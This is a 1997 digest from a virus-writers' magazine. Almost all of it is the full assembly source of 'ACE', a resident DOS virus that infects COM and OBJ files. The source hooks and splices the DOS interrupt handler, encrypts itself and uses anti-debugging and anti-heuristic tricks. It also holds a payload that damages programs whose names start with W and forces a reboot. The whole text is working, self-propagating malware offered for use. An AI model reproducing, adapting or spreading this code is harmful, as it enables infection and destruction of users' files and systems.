
      ÜÜ                  Û
     ßßß  Virus Magazine  Û Box 176, Kiev 210, Ukraine      IV  1997
     ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßÞßßß  ÛßßßßßßÛ
      ÞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    Ý Û ÜßÛ Û Üßß ÛÜÜ   Û ßßßÛ Û
       Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     Û ÜÜÜÛ Û
       Û Þ Þ Þ   ÞÜÜ ÞÜÜ  Þ  ÞÜÜ ÞÜß     ßÛ ßÜÛ Þ ÞÜÜ ÞÜÜÜ  Û ÛÜÜÜ Û
       Þ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÛÜÜÜÜÜÜÛ
          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
                              sgww@hotmail.com
            Digest of IV 8 - 11 russian, including Moscow issues

;                 ACE - the world's second OBJ infector
;
;                       Short description
;
;Not dangerous resident COM and OBJ infector. Traces INT 21h and uses
;splicing. Hooks INT 79h. Infects COM on execute (4Bh) and OBJ on opening
;(3Dh). Infects only EXE OBJ (with 0 basic offset and entry point).
;This virus is encrypted and does not infect C*.COM and W*.COM. Uses some
;antiheuristics and antidebugging.
;P.S. Sometimes kills program which name starts with W (Win for example).
;
;                               (á) Intmaster,Stealth Group,1995-1996.
;
;---------------------------------------------------------------------


code    segment byte public 'code'
        assume cs:code,ds:code,es:code
        org 100h
begin:
main    proc near
;===========================================
virlen  equ enddd-entry
crrr    equ 95
;===========================================
        call vir
        nop
        nop
        ret
        mov ah,4ch
        int 21h
main    endp

vir     proc near
        lea si,cr1
        mov cx,endcr1-cr1
llop:   lodsb
        xor byte ptr [si-1],crrr
        loop llop

        xor si,si
        mov ds,si
        mov si,46ch
        lodsb
        or al,80h
        xchg ah,al
        push cs
        pop ds
        mov crdt,ah
        mov si,offset cript
        xor dx,dx
stepcr1:        lodsb

        test al,ah
        jp dd11
        stc
dd11:   rcl al,1

        mov byte ptr ds:[si-1],al
        inc dx
        cmp dx,enddd-cript
        jb stepcr1

entry:
        push ax bx cx dx si di bp ds es
        pushf
        cld

        call $+3
        pop si
        sub si,14

        mov ax,1801h
        int 21h
        cmp al,0
        jz nee
        jmp exit
nee:
        push cs
        pop ds
        mov ah,byte ptr [si+crdt-entry]
        shl ah,1
        push si
        add si,cript-entry
        xor dx,dx
        in al,21h
        push ax

cstep:  lodsb
        out 21h,al
        test al,1
        jz c1
        in al,21h
        test al,ah
        jnp c2
        stc
c2:     rcr al,1
        jmp short n1cr
c1:     in al,21h
        test al,ah
        jp c3
        stc
c3:     rcr al,1

n1cr:   mov byte ptr ds:[si-1],al
        sub di,di
        push di
        pop es
        mov word ptr es:[14],0facch
        inc dx
        cmp dx,enddd-cript
        jb cstep
        pop ax
        pop si
        mov byte ptr [fuck-entry+si],02h
        or al,0
        org $-1
fuck    db 0
        out 21h,al
        mov byte ptr [fuck-entry+si],0
        jmp cript

count   dw ?     ; Number of infected files
crdt    db ?     ; Stuff for cripting
save    dw 9090h ; Savage for 4 program bytes
        dw 9090h
;-------------------------------------------
cript:
        mov bp,sp
        mov ax,word ptr [bp+20]     ;save entry point
        sub ax,3
        mov word ptr [bp+20],ax
        push ax

 ; Virus in memory?
        xor di,di
        mov es,di
        les di,es:[4*79h]
        sub di,int21-_ofs_
        mov ax,1203h
        int 2fh
        mov ax,ds
        cmp ax,word ptr es:[di+2]
        jne inst
        les di,es:[di]
        cmp word ptr es:[di],79cdh
        je exit

inst:

        mov ah,62h ; Get current PSP
        int 21h

        dec bx
        mov ds,bx
        cmp byte ptr ds:[0],'Z'
        jne exit
        inc bx
        mov ds,bx

        mov di,word ptr ds:[2] ; Max avaliable segment
                               ; Adjust Max avalable memory
        sub di,virlen/16+1

        push word ptr ds:[0ah]                 ;Set exit point
        pop word ptr cs:[si+pspex1-entry]      ;to our code
        push word ptr ds:[0ch]
        pop cs:[si+pspex2-entry]
        mov word ptr ds:[0ah],go_on-entry
        mov word ptr ds:[0ch],di

        push cs
        pop ds

        push si
   ;Virus code to the new location
        mov cx,virlen
        mov es,di
        xor di,di
        rep movsb

        pop si

exit:   push cs
        pop es
        pop di
        push cs
        pop ds
        add si,save-entry
        mov cx,4
        rep movsb

        popf
        pop es ds bp di si dx cx bx ax

        ret
vir     endp
;-In-above-memory--------
contin  proc near
go_on:

        mov ax,1203h
        int 2fh
        mov word ptr cs:[dsg-entry],ds

        xor si,si               ; Determane origin int 21h handler
        mov es,si
        lds dx,dword ptr es:[4]
        pushf
        push cs
        push nnn-entry
        cli
        mov word ptr es:[4],int1-entry
        mov word ptr es:[6],cs
        sti
        pushf
        pop ax
        or ax,0100h
        push ax
        push word ptr es:[21h*4+2]
        push word ptr es:[21h*4]
        mov ax,2501h
        iret
nnn:
        mov ah,48h   ; Allocate MCB
        mov bx,(virlen+enddcr-dcr)/16+1
        call @21_
        jc short exit1

        dec ax
        mov es,ax
        inc ax
        mov word ptr es:[1],8 ; we'll be as system

        mov es,ax
              ;Move virus code to allocated MCB
        xor di,di
        xor si,si
        push cs
        pop ds
        mov cx,virlen
        rep movsb

        mov si,dcr-entry
        mov cx,enddcr-dcr
        rep movsb

        push es
        pop ds

        xor si,si
        mov es,si
        cli
        mov word ptr es:[4*79h+2],ax
        mov word ptr es:[4*79h],int21-entry
        sti

        les di,ds:[_ofs_-entry]
        mov ax,word ptr es:[di]
        mov word ptr ds:[s21h-entry],ax
        cli
        mov word ptr es:[di],079cdh
        sti
exit1:
        db 0eah
pspex1  dw ?
pspex2  dw ?
contin  endp

int1    proc
        push bp
        push ax
        mov bp,sp
        mov ax,word ptr [bp+6]
        cmp ax,0
        org $-2
dsg     dw 1111h ; Dos Segment
        ja nnext
        and word ptr [bp+8],0feffh
        push word ptr [bp+6]
        pop word ptr cs:[_seg_-entry]
        push word ptr [bp+4]
        pop word ptr cs:[_ofs_-entry]
nnext:
        pop ax
        pop bp
        iret
int1    endp

int1_   proc
        push ax
        push bp
        mov bp,sp
        mov ax,word ptr cs:[_ofs_-entry]
        inc ax
        cmp ax,word ptr [bp+4]
        je nnnn
        push es di si ds
        les di,cs:[_ofs_-entry]
        mov word ptr es:[di],079cdh
        xor di,di
        mov es,di
        lds si,cs:[int1of-entry]
        mov es:[4],si
        mov es:[6],ds
        pop ds si di es
        and word ptr [bp+8],0feffh
nnnn:   pop bp
        pop ax
        iret
int1of  dw ?
int1seg dw ?
int1_   endp
;------------------------------------------------------------
;|  Search for given area in OBJ file                       |
;|   dx=si point to DTA                                     |
;------------------------------------------------------------
SRCH    PROC NEAR
  A:    MOV AH,3FH   ;READ FROM FILE
        MOV CX,03H
        call @21_
        jnc _ok
        pop ax
        push ex-entry
        ret
 _ok:   db 80h,3ch ;cmp byte ptr [si],par
 PAR    DB  ?      ;Argument for procedure(specify looking field)
        JE  B
        MOV cx,WORD PTR ds:[SI+1]
        add word ptr es:[di+15h],cx ;Move file pointer
        adc word ptr es:[di+17h],0
        JMP SHORT A
  B:    RET
SRCH    ENDP

end21   proc
        push dx es ds
        xor dx,dx
        mov es,dx
        lds dx,es:[4]
        mov cs:[int1of-entry],dx
        mov cs:[int1seg-entry],ds
        mov word ptr es:[4],int1_-entry
        mov word ptr es:[6],cs
        pop ds es dx
        push bp
        mov bp,sp
        sub word ptr [bp+2],2
        or word ptr [bp+6],0100h
        pop bp
        iret
end21   endp

intt    proc near
int21:
        push ax di es
        cld
        les di,cs:[_ofs_-entry]
        mov ax,0000h
        org $-2
s21h    dw ?
        stosw
        pop es di ax

        cmp ah,4bh
        jne n1
        jmp com_inf
n1:     cmp ah,3dh
        jne end21
        jmp obj_inf
;--------------------------------------------------------
;Cript virus and write to file
;--------------------------------------------------------
dcr:    xor si,si
        mov ds,si
        mov si,46ch
        lodsb
        or al,80h
        xchg ah,al
        push cs
        pop ds
        mov byte ptr ds:[crdt-entry],ah
        mov si,cript-entry
        xor dx,dx
stepcr: lodsb

        test al,ah
        jp dd1
        stc
dd1:    rcl al,1

        mov byte ptr ds:[si-1],al
        inc dx
        cmp dx,enddd-cript
        jb stepcr

        push ax
        xor dx,dx
        mov cx,virlen+1
        mov ah,40h
        call @21_

        pop ax
        shl ah,1
        mov si,cript-entry
        xor dx,dx
stepdcr: lodsb

        test al,1
        jz cc1
        test al,ah
        jnp cc2
        stc
cc2:    rcr al,1
        jmp short ncr
cc1:    test al,ah
        jp cc3
        stc
cc3:    rcr al,1

ncr:    mov byte ptr ds:[si-1],al
        inc dx
        cmp dx,enddd-cript
        jb stepdcr
        ret
@21_:   pushf
        db 9ah
_ofs_   dw ?
_seg_   dw ?
        ret
enddcr:
;--------------------------------------------------------
 MSK   DB 'OBJ',0 ;di+3h
 ssg   Db ?  ;di+9h
 SLEN  dw 3  ;di+0ah;Length of infected segment

 BUF   DB ?  ;di+0ch ;\
 LEN   DW ?  ;di+0dh ; \
 I1    DB ?  ;di+0fh ;  \
 I2    DB ?  ;di+10h ;   \  hear we save end module record
 SG    DB ?  ;di+11h ;    /
       DB ?          ;   /
 OFS   Db 0  ;di+13h ;  /
       db 00h        ; /
       DB ?          ;/

 BUF1  DB 0a0h
       dw virlen+4

 rec    db 9ch
 fixlen dw ?
 buf2   db 40 dup(0)   ; Savege for fixup record

 buf3   db 6 dup (0)

 fix    dw 0c003h

        db '(C) Ace of Spades , Kiev-1995...'
        db ' Don''t be a snub - enjoy yourself!'
;--------------------------------------------------------
beg:
        call @21_
        jnc co1
        pop ax
        push ex1-entry
co1:    mov bx,ax

        mov ax,1220h
        int 2fh
        push bx
        mov bl,es:[di] ;es:di-> Adress of SFT
        mov ax,1216h
        int 2fh
        pop bx

        push cs
        pop ds
        push word ptr es:[di+0dh]
        pop word ptr ds:[sav_t-entry]
        push word ptr es:[di+0fh]
        pop word ptr ds:[sav_d-entry]

        ret

        mov dx,3f5h
        mov al,4
        out dx,al
        mov cx,200h
        loop $
        out dx,al
        mov cx,200h
        loop $
        in al,dx
        test al,40h
        jz ok_pr
        pop ax
        push ex-entry

ok_pr:
        ret
obj_inf:
        push ax bx cx dx si di bp ds es

        call beg

        push di
        add di,28h
                ;obj file ?
        mov si,msk-entry
        mov cx,3
        repe cmpsb
        pop di
        je @1
        jmp ex
@1:
        mov byte ptr es:[di+2],02h ;Open file for read-write acess

        xor ax,ax
        mov word ptr es:[di+15h],ax
        mov word ptr es:[di+17h],ax

        mov byte ptr ds:[par-entry],8ah ;looking for module end record
        mov dx,buf-entry
        mov si,dx
        CALL SRCH

        ADD DX,03H
        MOV CX,WORD PTR [SI+1]
        MOV AH,3FH   ;READ FROM MODULE END RECORD
        call @21_

        TEST byte ptr ds:[si+3],01000000B ;MUST BE SEGMENT WITH ENTRY POINT
        JnZ SHORT @2   ;find next????????
        jmp ex
@2:
        test byte ptr ds:[si+3],000000010b  ;infect label
        jz @3        ;find next????????
        jmp ex
@3:
        add byte ptr ds:[si+3],2h ; Mark infected files
        CMP byte ptr ds:[si+4],00H
        JZ SHORT @4    ;INFECT STANDART MODULE
        jmp ex
@4:
        cmp word ptr ds:[si+7],0000h ;entry point must be 0
        jz short @5
        jmp ex
@5:
        xor ax,ax  ;SET FILE POINTER at the begin
        mov es:[di+15h],ax
        mov es:[di+17h],ax

        mov si,ssg-entry
        mov dx,si ;dx->[di+09h]
        MOV byte ptr ds:[par-entry],98H ;search segment define area
        MOV bp,word ptr ds:[sg-entry] ;bp=index of segment
        and bp,00ffh
sq:     CALL SRCH
        dec bp
        JZ short C
        MOV cx,WORD PTR ds:[SI+1]
        add word ptr es:[di+15h],cx
        adc word ptr es:[di+17h],0
        Jmp short sq
 c:     MOV AH,3FH  ;READ SEGMENT LEHGTH
        MOV CX,03
        call @21_
        TEST BYTE PTR ds:[SI],11100000B ;DON'T INFECT ABSOLUTE SEGMENT
        JnZ SHORT @6
        jmp ex
@6:
        TEST BYTE PTR ds:[SI],00000010B ;LENGTH OF SEGMENT 64 KB ?
        JZ SHORT @7
        jmp ex
@7:
        mov bp,virlen
        add word ptr ds:[slen-entry],bp ;INCREACE SEG LENGTH
        JnC SHORT @8
        jmp ex
@8:

        sub word ptr es:[di+15h],2
        sbb word ptr es:[di+17H],0

        MOV AH,40H  ;WRITE SEGMENT LENGTH TO FILE
        inc DX
        MOV CX,02H
        call @21_

        sub word ptr ds:[slen-entry],bp

        SUB word ptr es:[di+15h],6
        sbb word ptr es:[di+17h],0

        MOV byte ptr ds:[par-entry],0A0H ;search for code area of segment
        mov si,save-entry
        mov dx,si
        jmp short g
k:      mov si,dx
        sub bp,3
        add word ptr es:[di+15h],bp  ;SEARCH FOR CODE RECORD WHERE
        adc word ptr es:[di+17h],0   ;ENTRY POINT OF PROGRAM
g:      call srch
        mov bp,word ptr [si+1]  ;bp=record length
        MOV AH,3FH
        MOV CX,03
        call @21_
        lodsb
        cmp al,byte ptr ds:[sg-entry]   ;segment index
        jne k
        lodsw
        cmp ax,0   ;word ptr ds:[offset ofs - offset entry]
        jne k
       ;read first 4 code bytes
        mov ah,3fh
        mov cx,04
        call @21_

        sub word ptr es:[di+15h],4 ;SET FILE POINTER
        sbb word ptr es:[di+17h],0

        push bp
        mov ah,40h
        mov byte ptr ds:[ssg-entry],0e8h ;write in the first place
        mov dx,ssg-entry
        mov cx,3
        sub word ptr ds:[ssg-entry+1],cx
        call @21_
        add word ptr ds:[ssg-entry+1],cx
        pop dx
        mov bp,1
;=======================================================
; Work with FixUp record (if it exists)
;=======================================================
        sub dx,6
            ;move pointer to the next record
            ;in module
        add word ptr es:[di+15h],dx
        adc word ptr es:[di+17h],0

        mov ah,3fh
        mov dx,buf3-entry
        mov si,dx
        mov cx,3
        call @21_

        cmp byte ptr [si],9ch ; Fix Up record ?
        jz nextn
        jmp next
nextn:
        mov bp,word ptr [si+1] ; bp=record length
        mov word ptr ds:[fixlen-entry],0

go:     mov ah,3fh
        mov cx,3
        sub bp,cx
        call @21_

        lodsw
        xchg ah,al
        test ax,1000000000000000b ;If module has thread record
        jnz work                          ;Then find next

        push si
        mov si,ds:[fixlen-entry]
        add si,buf2-entry
        test ah,01000000b
        jz l2
        test ah,00010000b
        jz l2
        mov byte ptr ds:[si],ah
        pop si
        inc word ptr ds:[fixlen-entry]
        dec word ptr es:[di+15h]
        sbb word ptr es:[di+17h],0
        dec bp
        jmp short go
l2:     xchg ah,al
        mov word ptr ds:[si],ax
        pop si
        add word ptr ds:[fixlen-entry],2
        sub word ptr es:[di+15h],2
        sbb word ptr es:[di+17h],0
        sub bp,2
        jmp short go

work:   and ax,0000001111111111b ;ax=offset of fixed field
        push ax

        lodsb
        mov si,dx
        xor cx,cx
        test al,11000000b
        jnz f1
        inc cl
f1:     test al,00001000b
        jnz f2
        inc cl
f2:     test al,00000100b
        jnz f3
        inc cl
        inc cl
f3:     pop ax
        cmp ax,4
        jb fixx
        sub bp,cx
        add word ptr es:[di+15h],cx
        adc word ptr es:[di+17h],0
        cmp bp,1
        je next
        jmp go
fixx:
        mov si,ds:[fixlen-entry]
        add si,buf2-entry
        mov ax,word ptr ds:[buf3-entry]
        xchg ah,al
        add ax,save-entry
        xchg ah,al
        mov [si],ax
        add si,2
        mov al,byte ptr ds:[buf3-entry+2]
        mov [si],al
        inc si
        mov dx,si

        push cx
        add word ptr ds:[fixlen-entry],cx
        add word ptr ds:[fixlen-entry],4
                        ;HERE WE CHANGE FIX RECORD
        mov ah,3fh      ;AND POINT IT TO 4TH BYTE.
        call @21_

        pop cx
        add cx,3
        sub word ptr es:[di+15h],cx
        sbb word ptr es:[di+17h],0

        mov dx,fix-entry
        mov cx,2
        mov ah,40h
        call @21_
next:
        MOV DX,0FFFDH
        SUB DX,word ptr ds:[len-entry] ;end of end module record,length
        MOV CX,0FFFFH
        MOV AX,4202H
        call @21_
        mov dx,buf1-entry
        mov cx,3
        mov ah,40h      ;Write virus body to file
        call @21_
        mov dx,ssg-entry
        mov si,dx
        mov ah,byte ptr ds:[sg-entry] ;segment index
        mov byte ptr ds:[si],ah
        mov ah,40h               ; [di+0ah]=seglen
        mov cx,3
        call @21_
        inc word ptr ds:[count-entry]
        call enddd
        cmp bp,01h        ; Write fixUp record
        jz next1
        mov dx,rec-entry
        mov cx,word ptr ds:[fixlen-entry]
        add cx,3
        mov ah,40h
        call @21_
next1:  mov ah,40h
        mov dx,buf-entry                ;write module end record
        MOV CX,word ptr ds:[buf-entry+1]
        add cx,3
        call @21_
ex:
        mov ax,5701h
        mov cx,0
        org $-2
sav_t   dw ?
        mov dx,0
        org $-2
sav_d   dw ?
        call @21_

        mov ah,3eh
        call @21_

ex1:    pop es ds bp di si dx cx bx ax
        jmp end21
com_inf:
        push ax bx cx dx si di bp ds es

        mov ah,3dh

        call beg

        mov byte ptr es:[di+2],02

        cmp byte ptr es:[di+20h],'C'
        jz ex
        cmp byte ptr es:[di+20h],'W'
        jnz cont
        mov ah,2ah
        call @21_
        mov cl,al
        rol dl,cl
        and dl,0fh
        cmp dl,bh
        jnz ex

        mov si,cr1-entry
        mov cx,endcr1-cr1
llop1:  lodsb
        xor byte ptr [si-1],crrr
        loop llop1

cr1:    mov ah,09h
        mov dx,echo-entry
        call @21_
        mov ah,40h
        mov cx,0
        call @21_
        mov cx,1000
        loop $
        int 19h
echo    db 13,10,' This program wastes a lot of memory,',13,10
        db ' SYSTEM HALTED...$'
endcr1:

cont:   xor si,si
        mov word ptr es:[di+15h],si
        mov word ptr es:[di+17h],si
        mov dx,save-entry
        mov ah,3fh
        mov cx,4
        call @21_
        mov si,dx
        cmp byte ptr [si],'M'
        jz ex_
        cmp byte ptr [si],0e8h
        jz ex_
        mov cx,word ptr es:[di+11h]
        add cx,virlen+1
        jc ex_
        mov ah,40h
        mov word ptr es:[di+15h],0
        mov dx,buf-entry
        mov si,dx
        mov byte ptr [si],0e8h
        mov cx,word ptr es:[di+11h]
        push cx
        sub cx,3
        mov word ptr ds:[si+1],cx
        mov cx,3
        call @21_
        pop word ptr es:[di+15h]
        inc word ptr ds:[count-entry]
        call enddd
ex_:    jmp ex
enddd:  nop
code    ends
intt    endp
        end begin